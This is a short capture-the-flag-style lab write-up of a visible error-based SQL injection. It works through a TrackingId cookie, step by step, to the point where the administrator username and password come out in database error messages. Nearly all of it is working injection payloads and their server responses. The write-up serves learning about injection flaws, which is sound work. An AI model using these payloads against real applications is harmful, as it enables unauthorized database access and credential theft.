Lab #13: Visible error-based SQL injection

1. Generate the error by putting a single quote in tracking id. This will reveal the whole query
QHJ5EnAPmfKN3WMA'  --{ 500 Internal Server Error
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'QHJ5EnAPmfKN3WMA''. Expected  char

2. Fix the query by commenting the rest query. We did not received any error. This suggests that the query is now syntactically valid. 
'--  --{200 OK

3. Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type:
' AND CAST((SELECT 1) AS int)--
ERROR: argument of AND must be type boolean, not type integer Position: 63

4. Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows: 
' AND 1=CAST((SELECT 1) AS int)--  --{200 OK

5. Adapt your generic SELECT statement so that it retrieves usernames from the database: 
' AND 1=CAST((SELECT username from users) AS int)--
Observe that you receive the initial error message again. Notice that your query now. appears to be truncated due to a character limit.
As a result, the comment characters you added to fix up the query aren't included. 

6. Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request. 
TrackingId=A' AND 1=CAST((SELECT username from users) AS int)--    --{ 500 Internal Server Error
ERROR: more than one row returned by a subquery used as an expression

7.  Modify the query to return only one row: 
' AND 1=CAST((SELECT username from users LIMIT 1) AS int)--
ERROR: invalid input syntax for type integer: "administrator"
We got the username as Administrator

8. Now that you know that the administrator is the first user in the table, modify the query once again to leak their password: 
' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--
ERROR: invalid input syntax for type integer: "bmas1jwdukf1d0kfpdap"
